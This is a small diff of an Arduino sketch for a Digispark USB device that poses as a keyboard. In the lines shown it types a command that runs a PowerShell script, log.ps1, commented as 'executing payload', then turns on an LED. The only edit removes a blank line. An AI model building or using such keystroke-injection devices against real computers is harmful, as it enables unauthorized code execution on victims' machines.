@@ -19,7 +19,6 @@ void loop() {
   DigiKeyboard.delay(100);
   DigiKeyboard.println(".\\log.ps1"); //executing payload
   DigiKeyboard.delay(100);
-
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
   digitalWrite(1, LOW); 
